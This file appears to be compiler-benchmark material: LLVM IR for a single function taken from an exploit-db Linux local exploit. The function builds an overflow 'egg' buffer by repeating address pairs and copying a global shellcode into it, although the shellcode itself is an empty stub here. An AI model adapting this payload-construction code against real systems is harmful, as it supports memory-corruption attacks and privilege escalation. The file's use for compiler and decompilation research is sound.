; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_24182.c_egg.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_24182.c_egg.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shellcode = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @egg(i32 %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %7, align 4
  %9 = load i32, i32* @shellcode, align 4
  %10 = call i32 @strlen(i32 %9)
  store i32 %10, i32* %8, align 4
  %11 = call i64 @malloc(i32 1250)
  %12 = inttoptr i64 %11 to i8*
  store i8* %12, i8** %6, align 8
  %13 = load i8*, i8** %6, align 8
  store i8* %13, i8** %5, align 8
  br label %14

14:                                               ; preds = %17, %2
  %15 = load i32, i32* %7, align 4
  %16 = icmp slt i32 %15, 1248
  br i1 %16, label %17, label %35

17:                                               ; preds = %14
  %18 = load i32, i32* %4, align 4
  %19 = sub i32 %18, 8
  %20 = zext i32 %19 to i64
  %21 = inttoptr i64 %20 to i32*
  %22 = load i8*, i8** %5, align 8
  %23 = bitcast i8* %22 to i32**
  store i32* %21, i32** %23, align 8
  %24 = load i8*, i8** %5, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 4
  store i8* %25, i8** %5, align 8
  %26 = load i32, i32* %3, align 4
  %27 = zext i32 %26 to i64
  %28 = inttoptr i64 %27 to i32*
  %29 = load i8*, i8** %5, align 8
  %30 = bitcast i8* %29 to i32**
  store i32* %28, i32** %30, align 8
  %31 = load i8*, i8** %5, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 4
  store i8* %32, i8** %5, align 8
  %33 = load i32, i32* %7, align 4
  %34 = add nsw i32 %33, 8
  store i32 %34, i32* %7, align 4
  br label %14

35:                                               ; preds = %14
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1250
  store i8 0, i8* %37, align 1
  %38 = load i32, i32* %8, align 4
  %39 = load i8*, i8** %5, align 8
  %40 = sext i32 %38 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  store i8* %42, i8** %5, align 8
  %43 = load i8*, i8** %5, align 8
  %44 = load i32, i32* @shellcode, align 4
  %45 = call i32 @strcpy(i8* %43, i32 %44)
  %46 = load i8*, i8** %6, align 8
  store i8* %46, i8** %5, align 8
  %47 = load i8*, i8** %5, align 8
  ret i8* %47
}

declare dso_local i32 @strlen(i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strcpy(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
